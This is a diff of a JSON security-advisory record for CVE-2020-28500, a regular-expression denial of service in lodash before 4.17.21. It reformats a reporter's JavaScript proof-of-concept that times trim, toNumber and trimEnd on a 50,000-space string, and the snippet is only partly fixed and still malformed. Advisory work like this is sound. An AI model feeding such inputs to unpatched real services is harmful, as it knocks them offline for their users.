@@ -75,12 +75,12 @@
         "Value": "CVE-2020-28500"
       }
     ],
-    "Description": "All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions. \n\nSteps to reproduce (provided by reporter Liyuan Chen):\n```js\nvar lo = require('lodash');\n\nfunction build_blank(n) {\n    var ret = \"1\"\n    for (var i = 0; i \u003c n; i++) {\n        ret += \" \"\n    }\n    return ret + \"1\";\n}\nvar s = build_blank(50000) var time0 = Date.now();\nlo.trim(s) var time_cost0 = Date.now() - time0;\nconsole.log(\"time_cost0: \" + time_cost0) var time1 = Date.now();\nlo.toNumber(s) var time_cost1 = Date.now() - time1;\nconsole.log(\"time_cost1: \" + time_cost1) var time2 = Date.now();\nlo.trimEnd(s) var time_cost2 = Date.now() - time2;\nconsole.log(\"time_cost2: \" + time_cost2)\n```",
+    "Description": "All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions. \n\nSteps to reproduce (provided by reporter Liyuan Chen):\n```js\nvar lo = require('lodash');\n\nfunction build_blank(n) {\n    var ret = \"1\"\n    for (var i = 0; i \u003c n; i++) {\n        ret += \" \"\n    }\n    return ret + \"1\";\n}\nvar s = build_blank(50000) var time0 = Date.now();\nlo.trim(s) \nvar time_cost0 = Date.now() - time0;\nconsole.log(\"time_cost0: \" + time_cost0);\nvar time1 = Date.now();\nlo.toNumber(s) var time_cost1 = Date.now() - time1;\nconsole.log(\"time_cost1: \" + time_cost1);\nvar time2 = Date.now();\nlo.trimEnd(s);\nvar time_cost2 = Date.now() - time2;\nconsole.log(\"time_cost2: \" + time_cost2);\n```",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2022-01-06T20:30:46Z",
     "Severity": "MODERATE",
     "Summary": "Regular Expression Denial of Service (ReDoS) in lodash",
-    "UpdatedAt": "2023-10-18T22:34:24Z",
+    "UpdatedAt": "2023-10-24T21:03:52Z",
     "WithdrawnAt": "",
     "CVSS": {
       "Score": 5.3,
